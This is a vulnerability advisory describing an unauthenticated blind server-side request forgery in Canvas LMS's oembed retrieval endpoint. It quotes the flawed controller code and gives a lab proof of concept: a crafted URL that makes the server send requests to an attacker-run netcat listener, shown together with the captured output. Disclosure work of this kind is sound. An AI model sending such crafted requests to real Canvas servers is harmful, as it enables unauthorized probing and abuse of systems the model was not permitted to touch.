# Canvas LMS Unauthenticated Blind SSRF

Medium

[← View More Research Advisories](/security/research)
### Synopsis

A server-side request forgery vulnerability exists in the /external\_content/retrieve/oembed route. A remote, unauthenticated attacker can exploit this vulnerability to force the Canvas LMS application to perform HTTP GET requests to arbitrary domains. An attacker could abuse this to cause the Canvas application to generate requests to other URLs.

The flaw exists in external\_content\_controller's oembed\_retrieve method. The endpoint parameter is parsed, and subsequently passed to CanvasHttp.get() as an argument. This fires off an HTTP GET request to the endpoint specified, and the url parameter will contain arbitrary content.

```

def oembed_retrieve
    endpoint = params[:endpoint]
    url = params[:url]
    uri = URI.parse(endpoint + (endpoint.match(/\?/) ? '&url=' : '?url=') + CGI.escape(url) + '&format=json')
    begin
      res = CanvasHttp.get(uri.to_s)  # SSRF vulnerability
      data = JSON.parse(res.body)
      content_item = Lti::ContentItemConverter.convert_oembed(data)
    rescue StandardError
      content_item = {}
    end
    render :json => [content_item]
  end

```

Below I have set up a test scenario for proof of concept.

### Proof of Concept

The Canvas LMS application is hosted at 192.168.1.189. I also set up a Netcat listener at 192.168.1.191:4444. Additionally, I started tcpdump on the machine hosting Canvas.

After visiting

```
http://192.168.1.189/external_content/retrieve/oembed?endpoint=http://192.168.1.191:4444&url=scooby
```
in a web browser, the following tcpdump output was observed:
```

bitnami@debian:~$ sudo tcpdump -i enp0s3 -X "tcp port 4444"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s3, link-type EN10MB (Ethernet), capture size 262144 bytes

```

Notice that an HTTP request was sent **out** over TCP port 4444 to 192.168.1.191.

Here is the output from my netcat listener:

```

sh-3.2$ nc -lv 4444
GET /?url=scooby&format=json HTTP/1.1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Connection: close
Host: 192.168.1.191:4444

```

Notice that the value of the url parameter can be controlled. This allows an attacker to send requests containing arbitrary messages.

### Solution

An official patch is not yet available. However, a proposed fix was committed to master on GitHub.
